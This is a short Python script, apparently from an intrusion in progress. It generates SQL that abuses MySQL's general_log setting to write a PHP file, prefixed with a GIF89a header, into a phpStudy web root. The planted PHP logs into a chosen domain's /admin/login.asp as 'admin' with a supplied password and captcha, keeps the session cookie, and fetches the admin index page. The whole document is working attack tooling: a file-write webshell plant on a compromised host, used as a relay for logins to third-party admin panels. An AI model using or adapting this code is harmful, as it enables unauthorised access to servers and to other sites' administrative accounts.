#!/usr/bin/env python3
"""gen_sess_check.py - 生成sess_check.php(81.70登录+cookie保持+访问后台)
?d=域名&p=密码&c=验证码 → 登录后带cookie访问/index.asp等后台页
"""
body = '<?php $d=$_GET["d"];$p=$_GET["p"];$c=$_GET["c"];$jar="C:/phpStudy/WWW/sc_".md5($d).".txt";$ch=curl_init("http://".$d."/admin/login.asp?action=check");curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch,CURLOPT_POSTFIELDS,"username=admin&password=".$p."&Code=".$c);curl_setopt($ch,CURLOPT_COOKIEJAR,$jar);curl_setopt($ch,CURLOPT_COOKIEFILE,$jar);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,0);curl_setopt($ch,CURLOPT_HEADER,1);curl_setopt($ch,CURLOPT_TIMEOUT,12);$r=curl_exec($ch);echo "LOGIN_HEAD|".substr($r,0,500)."|BODY|".substr($r,-200)."|";$ch2=curl_init("http://".$d."/admin/index.asp");curl_setopt($ch2,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch2,CURLOPT_COOKIEJAR,$jar);curl_setopt($ch2,CURLOPT_COOKIEFILE,$jar);curl_setopt($ch2,CURLOPT_TIMEOUT,12);$r2=curl_exec($ch2);echo "ADMINPAGE_LEN:".strlen($r2)."|".substr($r2,0,300);?>'

assert "'" not in body.replace("php://input", "")
sql = []
sql.append("SET GLOBAL general_log=OFF;")
sql.append("SET GLOBAL general_log_file='C:/phpStudy/WWW/sess_check.php';")
sql.append("SET GLOBAL general_log=ON;")
sql.append("SELECT 'GIF89a%s//'" % body)
sql.append("SET GLOBAL general_log=OFF;")
with open('/tmp/sess_check.sql', 'w') as f:
    f.write('\n'.join(sql) + '\n')
print('ready, len:', len(body))
